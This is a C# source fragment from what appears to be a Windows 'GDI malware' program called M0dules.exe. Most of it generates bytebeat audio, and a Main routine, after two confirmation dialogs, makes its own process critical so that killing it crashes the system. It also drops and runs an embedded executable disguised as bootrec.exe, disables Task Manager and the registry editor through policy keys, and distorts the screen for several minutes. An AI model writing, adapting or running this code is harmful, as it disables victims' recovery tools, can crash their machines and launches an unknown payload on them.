			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}
	public static void by4()
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 16000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = 30;

			var data = new byte[sample_rate * seconds];

			for (var t = 4; t < data.Length; t++)
				data[t] = (byte)(
					t * (t >> (0xdead & t >> 12)) | t << (t >> 8)
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}
	public static void by5()
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = 30;

			var data = new byte[sample_rate * seconds];

			for (var t = 4; t < data.Length; t++)
				data[t] = (byte)(
					(t & t >> 12) * (t >> 4 | t >> 8) * t
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}
	public static void by6()
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = 30;

			var data = new byte[sample_rate * seconds];

			for (var t = 4; t < data.Length; t++)
				data[t] = (byte)(
					(t * (t >> 5 | t >> 8) | t >> 80 ^ t) + 64
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}
	public static void by7()
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = 30;

			var data = new byte[sample_rate * seconds];

			for (var t = 4; t < data.Length; t++)
				data[t] = (byte)(
					t * ((t >> 7 | t >> 9) & 30) & t << 1
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
	[STAThread]
	private static void Main()
	{
		IntPtr dC = GetDC(IntPtr.Zero);
		Drawer bb1 = new bb1();
		Drawer bb2 = new bb2();
		Drawer bb3 = new bb3();
		Drawer bb4 = new bb4();
		Drawer drawer = new Drawer1();
		Drawer drawer2 = new Drawer2();
		Drawer drawer3 = new Drawer3();
		Drawer drawer4 = new Drawer4();
		Drawer drawer5 = new Drawer5();
		Drawer drawer6 = new Drawer6();
		Drawer drawer7 = new Drawer7();
		Drawer drawer8 = new Drawer8();
		Drawer drawer9 = new Drawer9();
		Drawer drawer10 = new Drawer10();
		Drawer drawer11 = new Drawer11();
		Drawer drawer12 = new Drawer12();
		Drawer wintext = new Windowtext();
		Drawer cur = new Cur();
		if (MessageBox.Show("Run Malware?", "M0dules.exe", MessageBoxButtons.YesNo) == DialogResult.Yes)
		{
			if (MessageBox.Show("Are you sure?", "M0dules.exe", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				int isCritical = 1;  // we want this to be a Critical Process
				int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
				Process.EnterDebugMode();
				NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
				string path = Path.Combine(Path.GetTempPath(), "bootrec.exe");
				File.WriteAllBytes(path, m0dules.Properties.Resources.mal);
				Process.Start(path);
				RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
				RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
				Thread.Sleep(3000);
				wintext.Start();
				cur.Start();
				bb1.Start();
				drawer.Start();
				Thread.Sleep(29000);
				bb1.Stop();
				Thread.Sleep(1000);
				drawer.Stop();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				bb2.Start();
				drawer2.Start();
				Thread.Sleep(29000);
				bb2.Stop();
				Thread.Sleep(1000);
				drawer2.Stop();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				bb3.Start();
				drawer3.Start();
				Thread.Sleep(29000);
				bb3.Stop();
				Thread.Sleep(1000);
				drawer3.Stop();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				Thread.Sleep(1000);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				slow1(dC);
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				drawer4.Start();
				drawer5.Start();
				drawer6.Start();
				by1();
				drawer4.Stop();
				drawer5.Stop();
				drawer6.Stop();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				drawer7.Start();
				by2();
				drawer7.Stop();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				drawer8.Start();
				by3();
				drawer8.Stop();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				drawer9.Start();
				by4();
				drawer9.Stop();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				drawer11.Start();
				drawer5.Start();
				by6();
				drawer5.Stop();
				drawer11.Stop();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				drawer10.Start();
				drawer6.Start();
				drawer3.Start();
				drawer7.Start();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				by5();
				RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
				drawer6.Stop();
				drawer3.Stop();
				drawer7.Stop();
				drawer10.Stop();
				drawer12.Start();
				by7();
				drawer12.Stop();
				Environment.Exit(0);
			}

		}
	}

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(uint crColor);

	[DllImport("gdi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteObject([In] IntPtr hObject);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetDC(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

	[DllImport("gdi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

	[DllImport("gdi32.dll")]
	private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

	[DllImport("user32.dll")]
	private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);
}
